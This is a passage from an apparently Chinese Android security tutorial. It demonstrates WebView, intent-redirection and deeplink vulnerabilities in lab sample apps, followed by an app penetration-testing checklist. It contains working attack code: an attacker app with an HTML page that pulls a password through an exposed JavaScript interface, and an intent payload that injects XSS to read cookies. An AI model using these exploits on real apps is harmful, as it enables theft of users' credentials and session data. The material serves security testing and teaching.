class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以看出我们获取了密码<code>WindXaa12345678</code>，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了</p><p>我们将该组件设置为导出组件</p><p><img src="assets/905443_8793MBMDUVDZESQ.png" alt="image-20220729171422196"></p><p>我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击</p><p>编写攻击样本:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在本地编写恶意的html，利用前面讲述的远程加载</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>攻击获得的数据将显示在此……<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>然后启动http_server</p><p><img src="assets/905443_25GBQWTFBW4APF8.png" alt="image-20220729172309137"></p><p>此时我们启动攻击样本，并点击按钮，就能加载我们的恶意html，进而获得敏感信息</p><h5 id="Intent重定向导致launchAnyWhere漏洞"><strong>Intent重定向导致launchAnyWhere漏洞</strong></h5><p><strong>漏洞原理</strong></p><p>导出组件往往存在一定的安全问题</p><p>导出组件一般有下面三种形式：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为<span class="keyword">true</span>;</span><br><span class="line"><span class="number">2.</span>如果组件没有显式设置android:exported为<span class="keyword">false</span>，但是其intent-<span class="keyword">filter</span>以及action存在，则也为导出组件</span><br><span class="line"><span class="number">3.</span>API <span class="keyword">Level</span>在<span class="number">17</span>以下的所有App的provider组件的android:exported属性默认值为<span class="keyword">true</span>，<span class="number">17</span>及以上默认值为<span class="keyword">false</span>。</span><br></pre></td></tr></table></figure><p>未导出组件</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">组件显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">组件没有intent-<span class="built_in">filter</span>, 且没有显式设置android:exported的属性值，默认为非导出的;</span><br><span class="line">组件虽然配置了intent-<span class="built_in">filter</span>,，但是显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure><p>而通过一些方法可以访问未导出的组件，这种漏洞成为launchAnyWhere漏洞</p><p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p><p><strong>漏洞复现</strong></p><p>首先是不可导出组件PrivateActivity:</p><p><img src="assets/905443_DFCPGD63DGYF3HU.png" alt="image-20220730124850689"></p><p>然后可导出的组件：WebView2Activity</p><p>代码层的校验代码：</p><p>WebView2Activity</p><p><img src="assets/905443_UTXVH9Q5AYRTWVH-17277663837329.png" alt="image-20220730125041041"></p><p>PrivateActivity</p><p><img src="assets/905443_MMQXRU274JXCJRT-172776639201112.png" alt="image-20220730125108657"></p><p>攻击代码：</p><p><img src="assets/905443_W4Q2EBR4BJMXG2R-172776641592615.png" alt="image-20220730125254413"></p><p>可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞</p><h4 id="Deeplink-WebView漏洞">Deeplink + WebView漏洞</h4><h5 id="任意代码执行漏洞"><strong>任意代码执行漏洞</strong></h5><p><strong>漏洞原理</strong></p><p>样本代码层通过反射调用某个手机上已经安装的应用，然后调用这个应用的方法，我们可以构造相同的包名，然后将攻击样本安装到手机上去，使得应用触发任意代码执行漏洞</p><p>样本代码</p><p><img src="assets/905443_ZTVPKHEC4XQMYCD.png" alt="image-20220730125800892"></p><p>调用com.insecureshopapp.Maininterface下的getinstance方法</p><p>构造攻击样本</p><p><img src="assets/905443_J9EY8R3E44SH4U5.png" alt="image-20220730125820419"></p><p>注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了</p><h5 id="xss注入漏洞"><strong>xss注入漏洞</strong></h5><p><strong>漏洞原理</strong></p><p>结合Deeplink+WebView导致的一个漏洞问题，我们可以构造含深度调用链的js，然后通过加载去实现xss注入</p><p><strong>漏洞复现</strong></p><p>首先我们查看样本的DeepLinks</p><p><img src="assets/905443_NAWTWSGDKWK8C82.png" alt="image-20220730130234190"></p><p>然后我们可以发现样本的代码：</p><p><img src="assets/905443_8KJCX2AWWZRCTQQ.png" alt="image-20220730130256549"></p><p>我们构造攻击脚本：</p><p><img src="assets/905443_QA4SKBFC23HK4T8.png" alt="image-20220730130336427"></p><p>然后我们通过去访问该html:</p><p><img src="assets/905443_7XWKDCAB62358C7.png" alt="image-20220730130416578"></p><p>接着我们使用目标样本打开：</p><p><img src="assets/905443_WZVGRQ9J7AZPFDA.png" alt="image-20220730130442740"></p><p>即可以成功的进行XSS注入</p><p><img src="assets/905443_ARQAAUCNDV3N5BR.png" alt="image-20220730130506890"></p><h5 id="DeepLinks在WebView上的组合漏洞">DeepLinks在WebView上的组合漏洞</h5><p>我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：</p><p><img src="assets/905443_V55CMQ4ACJKK8WX.png" alt="image-20220730130714437"></p><p>参考文章：<a href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APP漏洞利用组合拳——应用克隆案例分析</a></p><h5 id="loadDataWithBaseURL漏洞">loadDataWithBaseURL漏洞</h5><p><a href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?">Android中的特殊攻击面（二）——危险的deeplink</a></p><p>当<code>loadDataWithBaseURL</code>的域名和内容同时可控时，可以构造任意域下的XSS</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> loadDataWithBaseURL</span><br><span class="line">(<span class="built_in">String</span> baseUrl,</span><br><span class="line"><span class="built_in">String</span> <span class="built_in">data</span>,</span><br><span class="line"><span class="built_in">String</span> mimeType,</span><br><span class="line"><span class="built_in">String</span> encoding,</span><br><span class="line"><span class="built_in">String</span> historyUrl)</span><br></pre></td></tr></table></figure><p>除了明显的情况外，攻击者控制调用中的<code>baseUri</code>和参数<code>data</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL<span class="punctuation">(</span><span class="string">&quot;https://google.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong></p><p>deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞</p><p><strong>漏洞复现</strong></p><p>实现步骤：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)victim-app://c/contact/<span class="number">2</span>?fragmen_class=<span class="variable">&lt;fragment&gt;</span>可启动任意<span class="keyword">fragment</span>，并可 通过Intent Extra传参</span><br><span class="line">(<span class="number">2</span>)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment</span><br><span class="line">(<span class="number">3</span>)可污染<span class="built_in">load</span>DataWithBaseURL的前两个参数，构造victim.com域下的XSS</span><br><span class="line">webview.<span class="built_in">load</span>DataWithBaseURL(<span class="string">&quot;victim.com&quot;</span>,<span class="string">&quot;google-map.html&quot;</span>,    <span class="string">&quot;text/html&quot;</span>,    ...);</span><br></pre></td></tr></table></figure><p>攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW);</span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>));</span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>);</span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra);</span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure><h1>安全分析工具安全</h1><h2 id="drozer">drozer</h2><p>参考b站教程</p><h2 id="MobSF">MobSF</h2><p>docker安装报错，参考https://kresna.dev/solving-podman-error-short-name-did-not-resolve-to-an-alias-and-no-unqualified-search-registries/</p><p>github中下载项目，然后在相应文件夹下执行如下命令：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./setup.<span class="keyword">sh</span></span><br><span class="line">./<span class="keyword">run</span>.<span class="keyword">sh</span></span><br><span class="line">然后浏览器中 http:<span class="comment">//localhost:8000</span></span><br></pre></td></tr></table></figure><h1>APP渗透测试要点</h1><p>测试点如下图<img src="assets/image-20241005195332293.png" alt="image-20241005195332293"></p><h2 id="客户端程序安全">客户端程序安全</h2><h3 id="安装包签名">安装包签名</h3><p>如下命令检查apk签名</p><p><strong>jarsigner.exe -verify APK 文件路径 -verbose -certs</strong>     如果CN=t001s则安全</p><p>只有在使用直接客户的证书签名时，才认为安全。Debug 证书、第三方（如</p><p>开发方）证书等等均认为风险。</p><p><strong>安全建议</strong></p><p>将安装包进行签名并检测安装包签名的异常</p><h3 id="反编译保护">反编译保护</h3><p>​        测试客户端安装程序，判断是否能反编译为源代码，java 代码和 so 文件是否存在代码混淆等保护措施。未作保护的 java 代码，可以轻易分析其运行逻辑，并针对代码中的缺陷对客户端或服务器端进行攻击。成功的反编译将使得攻击者能够完整地分析 APP 的运行逻辑，尤其是相关业务接口协议、和通信加密的实现</p><p>如果apk有花指令，apktool会出现解包失败</p><h3 id="应用完整性校验">应用完整性校验</h3><p>​        测试客户端程序是否对自身完整性进行校验。攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。</p><p><strong>如果没有进行校验</strong></p><p>对于修改后的apk进行重新打包签名安装，仍然会正常运行（需要注意的是，如果之前安装的 APK 和修改后的 APK 签名不同，就不能直接覆盖安装，一般来说，先卸载之前安装的 APP 即可）【注：APK 必须进行签名后，方可安装和运行。如果开启了“允许未知来源的应用”，那么 Debug 证书、自签名证书、过期证书的签名都是可以的，但是不可以不签名。】</p><p><strong>如果有进行校验</strong></p><p>安装的apk会无法正常运行</p><p><strong>威胁等级</strong></p><p>​        若应用完整性校验不使用 MANIFEST.MF 中的数据，且核心代码通过 JNI 技术写入.so库，同时于服务端进行相关校验，此时无风险。</p><p>​       若应用完整性于本地进行验证而不存在其他问题或使用 MANIFEST.MF 中的数据作为验证凭证（有新文件时提示应用完整性验证失败），此时低风险；</p><p>​       若在本地进行验证的基础上只通过 MANIFEST.MF 对客户端原有文件进行校验而忽略新增文件的检验，此时中风险；</p><p>​       若未进行应用完整性校验此时高风险</p><h3 id="组件安全">组件安全</h3><p>查看是否是可导出的</p><h2 id="敏感信息安全">敏感信息安全</h2><h3 id="数据文件">数据文件</h3><p>检测客户端是否保存明文敏感信息，能否防止用户敏感信息的非授权访问。</p><p>文件敏感信息泄露以明文存储“记住密码”居多。一般来说，先将安卓设备中的文件复制到有鼠标的主机上，方便查看。</p><p><strong>测试步骤</strong></p><p>首先查看相关文件的权限配置。</p><p>正常的文件权限最后三位应为空（类似“rw-rw----”），即除应用自己以外任何人无法读写；目录则允许多一个执行位（类似“rwxrwx—x”）。</p><p>当客户端使用 MODE_WORLD_READABLE 或 MODE_WORLD_WRITEABLE 模式创建文件时，shared_prefs 目录下文件的权限也会多出一些，这不一定是安全问题</p><p>权限检测完整后，再检查客户端程序存储在手机中的 SharedPreferences 配置文件，通常是对本目录下的文件内容（一般是 xml）进行检查，看是否包含敏感信息。</p><p>最后在检测 SQLite 数据库文件，在私有目录及其子目录下查找以.db 结尾的数据库文件。对于使用了 webView 缓存的应用，会在 databases 子目录中保存 webview.db 和webviewCache.db，如图所示。其中有可能会记录 cookies 和提交表单等信息。</p><p>还有些时候，客户端程序 apk 包中也是是保存有敏感信息的，比如检查 apk 包中各类文件是否包含硬编码的的敏感信息等。</p><h3 id="Logcat日志">Logcat日志</h3><p>本项主要是检查客户端程序存储在手机中的日志是否含有敏感信息。</p><p><strong>logcat -d</strong>    <strong>//一次性输出日志缓存，不会阻塞</strong></p><p><strong>安全建议</strong></p><p>数据传输应做到加密处理，敏感信息不要输出在 logcat 日志中</p><h2 id="密码安全"><strong>密码安全</strong></h2><h3 id="键盘劫持">键盘劫持</h3><p>测试客户端程序在密码等输入框是否使用自定义软键盘。安卓应用中的输入框默认使用系统软键盘，手机安装木马后，木马可以通过替换系统软键盘，记录手机键盘输过的密码</p><h3 id="随机布局软键盘">随机布局软键盘</h3><p>测试客户端实现的软键盘，是否满足键位随机布放要求。</p><h3 id="屏幕录像">屏幕录像</h3><p>客户端使用的随机布局软键盘是否会对用户点击产生视觉响应。当随机布局软键盘对用户点击产生视觉响应时，安卓木马可以通过连续截屏的方式，对用户击键进行记录，从而获得用户输入</p><p><strong>测试步骤</strong></p><p>adb shell /system/bin/screencap -p 输出 png 路径（安卓设备中）</p><p>在/mnt/sdcard/路径下，可以看到 1a.png：</p><p>还有一种验证方式是从代码方面进行验证：</p><p>首先检测需较高安全性的窗口（如密码输入框），看代码中在窗口加载时是否有类似下图的代码。按照 android SDK 的要求，开启 FLAG_SECURE 选项的窗口不能被截屏。<img src="assets/image-20241005211913001.png" alt="image-20241005211913001"></p><p>目前 FLAG_SECURE 测试结果：</p><p>N－PASS，可截图，</p><p>ZTE 880E, 可截图</p><p>ASUS TF300T，可阻止工具及 ddms 截图。</p><h3 id="手势密码">手势密码</h3><p>主要从手势密码的复杂度、修改和取消、本地信息保存、锁定策略、抗攻击测试等方面进行测试。</p><p><strong>手势密码的复杂度：</strong></p><p>观察对应代码逻辑是否有相应的判断和限制条件。（一般设置手势密码若输入点数过少时会有相应的文字提示，通过此文字提示可以快速定位到代码位置）</p><p><strong>手势密码的修改和取消：</strong></p><p>反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端对于手势密码的修改和删除是否存在相应的安全策略。</p><p><strong>手势密码的本地信息保存：</strong></p><p>首先通过正常的操作流程设置一个手势密码并完整一次完整的登陆过程，寻找/data/data 的私有目录下是否存在手势密码对应敏感文件，若进行了相关的信息保存，基本在此目录下。（关键词为 gesture，key 等）。观察存储方式是二进制形式还是明文形式，如果是二进制看看其对应位数判断进行的什么哈希散列。也可以通过这个数值定义代码位置进一步分析</p><p><strong>手势密码的抗攻击测试：</strong></p><ol><li><p>下载并安装 Xposed 框架及 SwipeBack 插件。</p></li><li><p>启动客户端并进入手势密码输入页。</p></li><li><p>启动 SwipeBack 插件，观察是否可以通过滑动关闭手势密码输入页的方式进入登陆后的页面</p></li></ol><h2 id="安全策略">安全策略</h2><h3 id="密码复杂度检测">密码复杂度检测</h3><p>测试客户端程序是否检查用户输入的密码强度，禁止用户设置弱口令</p><p>人工测试，尝试将密码修改为弱口令，如：123456，654321，121212，888888 等，查看客户端是否拒绝弱口令。也可以阅读逆向后的客户端 java 代码，寻找对用户输入口令的检查方法。</p><h3 id="账号登录限制">账号登录限制</h3><p>测试一个帐号是否可以同时在多个设备上成功登录客户端，进行操作。</p><p>人工测试。</p><h3 id="账户锁定策略"><strong>账户锁定策略</strong></h3><p>测试客户端是否限制登录尝试次数。防止木马使用穷举法暴力破解用户密码</p><p>人工测试。</p><h3 id="问题验证">问题验证</h3><p>测试对账号某些信息（如单次支付限额）的修改是否有私密问题验证。私密问题验证是否将问题和答案一一对应。私密问题是否足够私密</p><p>人工测试</p><h3 id="会话安全">会话安全</h3><p>测试客户端在超过 20 分钟无操作后，是否会使会话超时并要求重新登录。超时时间设置是否合理。</p><p>人工测试</p><h3 id="界面切换保护">界面切换保护</h3><p>检查客户端程序在切换到其他应用时，已经填写的账号密码等敏感信息是否会清空，防止用户敏感信息泄露。如果切换前处于已登录状态，切换后一定时间内是否会自动退出当前会话。</p><p><strong>测试步骤</strong></p><p>人工检测。在登录界面（或者转账界面等涉及密码的功能）填写登录名和密码，然后切出，再进入客户端，看输入的登录名和密码是否清除。登录后切出，5 分钟内自动退出为安全</p><h3 id="UI信息泄露">UI信息泄露</h3><p>检查客户端的各种功能，看是否存在敏感信息泄露问题。</p><p>人工测试。使用错误的登录名或密码登录，看客户端提示是否不同。在显示卡号等敏感信息时是否进行部分遮挡。</p><h3 id="验证码安全">验证码安全</h3><p>测试客户端在登录和交易时是否使用图形验证码。验证码是否符合如下要求：由数字和字母等字符混合组成；采取图片底纹干扰、颜色变换、设置非连续性及旋转图片字体、变异字体显示样式等有效方式，防范恶意代码自动识别图片上的信息；具有使用时间限制并仅能使用一次；验证码由服务器生成，客户端文件中不包含图形验证码文本内容。</p><h3 id="安全退出">安全退出</h3><p>测试客户端退出时是否正常终止会话。</p><p>检查客户端在退出时，是否向服务端发送终止会话请求。客户端退出后，还能否使用退出前的会话 id 访问登录后才能访问的页面</p><h3 id="密码修改验证">密码修改验证</h3><p>测试客户端在修改密码时是否验证旧密码正确性。</p><p>人工测试。</p><h3 id="Activity-界面劫持"><strong>Activity 界面劫持</strong></h3><p>检查是否存在 activity 劫持风险，确认客户端是否能够发现并提示用户存在劫持。</p><p>安装 HijackActivity.apk，使用 activity 界面劫持工具，在工具中指定要劫持的应用进程名称。如图所示，从列表中选择被测试的应用，点击 OK。打开应用，测试工具会尝试用自己的窗口覆盖被测的应用</p><h2 id="进程保护">进程保护</h2><h3 id="内存访问和修改"><strong>内存访问和修改</strong></h3><p>通过对客户端内存的访问，木马将有可能会得到保存在内存中的敏感信息（如登录密码，帐号等）。测试客户端内存中是否存在的敏感信息（账号、明文密码等等）。</p><p>需要 root 权限，可以使用 MemSpector 查看、搜索和修改客户端内存数据，如图所示。用户名、密码等数据通常会在/dev/ashmem/dalvik-heap 内存段。（目前大多数工具都是通过 ptrace 接口修改客户端内存，可以使用 ptrace 机制本身防护。）</p><h3 id="动态注入"><strong>动态注入</strong></h3><p>通过注入动态链接库，hook 客户端某些关键函数，从而获取敏感信息或者改变程序执行。</p><h2 id="通信安全">通信安全</h2><p>如果客户端与服务器之间的通信加密协议实现不当，攻击者将有机会对当前网络环境中其他合法用户的通信内容进行窃听甚至篡改。</p><h3 id="证书有效性"><strong>证书有效性</strong></h3><p>主要测试 SSL 协议安全性、SSL 证书验证等</p><p>首先测试客户端程序是否严格检查服务器端证书信息。通过修改 DNS，将客户端链接到的主页地址改为 <a href="https://mail.qq.com/%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E4%BC%9A%E6%8F%90%E7%A4%BA%E8%BF%9E%E6%8E%A5%E9%94%99%E8%AF%AF%E3%80%82%E6%AD%A4%E9%A1%B9%E6%B5%8B%E8%AF%95%E4%B8%BB%E8%A6%81%E9%92%88%E5%AF%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%98%AF%E5%90%A6%E5%AF%B9">https://mail.qq.com/，然后使用客户端访问服务端，查看客户端是否会提示连接错误。此项测试主要针对客户端是否对</a> SSL 证书中的域名进行确认。</p><p>也可以查阅代码中是否有 SSL 验证。下图是 Java 中进行服务端 SSL 证书验证的一种方式。关键函数为：java.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier()，通过此函数查找 HostnameVerifier 的 verify 函数。如 verify()函数总返回 true，则客户端对服务端 SSL 证书无验证。（可能还有其他 SSL 实现，需要验证）。</p><p><strong>安全建议</strong></p><p>使用 Https 方式进行加密，且服务器通过白名单方式验证客户端证书。</p><h3 id="关键数据加密和校检"><strong>关键数据加密和校检</strong></h3><p>测试客户端程序提交数据给服务端时，密码、收款人信息等关键字段是否进行了加密，防止恶意用户嗅探到用户数据包中的密码等敏感信息。</p><p>在手机上配置好代理，观察客户端和服务端的交互数据。检查关键字端是否加密。如果客户端对根证书进行了严格检测，导致代理无法使用。则可以将代理的根证书安装到设备上，使根证书可信。或是替换客户端 apk 中的根证书文件。如果上述方法均失效，则反编译为 java 代码，将客户端逆向后，通过阅读 java 代码的方式寻找客户端程序向服务端提交数据的代码，检查是否存在加密的代码。</p><h3 id="访问控制"><strong>访问控制</strong></h3><p>测试客户端访问的 URL 是否仅能由手机客户端访问。是否可以绕过登录限制直接访问登录后才能访问的页面，对需要二次验证的页面（如私密问题验证），能否绕过验证。</p><p>人工测试。在 PC 机的浏览器里输入 URL，尝试访问手机页面</p><h3 id="客户端更新安全性"><strong>客户端更新安全性</strong></h3><p>测试客户端自动更新机制是否安全。如果客户端更新没有使用官方应用商店的更新方式，就可能导致用户下载并安装恶意应用，从而引入安全风险。</p><p>使用代理抓取检测更新的数据包，尝试将服务器返回的更新 url 替换为恶意链接。看客户端是否会直接打开此链接并下载应用。在应用下载完毕后，测试能否替换下载的 apk 